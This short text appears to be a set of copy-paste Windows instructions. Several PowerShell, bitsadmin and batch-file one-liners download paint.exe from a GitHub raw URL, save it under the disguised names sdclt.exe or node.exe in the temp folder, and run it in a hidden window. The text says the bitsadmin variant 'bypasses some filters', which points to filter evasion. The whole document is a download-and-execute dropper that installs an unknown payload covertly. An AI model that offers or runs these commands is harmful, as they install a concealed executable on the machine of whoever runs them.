```url
https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe
```

CMD one-liner:

```cmd
powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile $env:TEMP\sdclt.exe; start $env:TEMP\sdclt.exe"
```

(or)

```cmd
powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile $env:TEMP\node.exe; start $env:TEMP\node.exe"
```

Alternative using bitsadmin (bypasses some filters):

```cmd
bitsadmin /transfer job /download /priority high https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe "%TEMP%\sdclt.exe" && start "%TEMP%\sdclt.exe"
```

(or)

```cmd
bitsadmin /transfer job /download /priority high https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe "%TEMP%\node.exe" && start "%TEMP%\node.exe"
```

Or copy-paste this into Notepad, save as run.cmd, double-click:

```cmd
@echo off
powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile %TEMP%\sdclt.exe; start %TEMP%\sdclt.exe"
```

(or)

```cmd
@echo off
powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile %TEMP%\node.exe; start %TEMP%\node.exe"
```
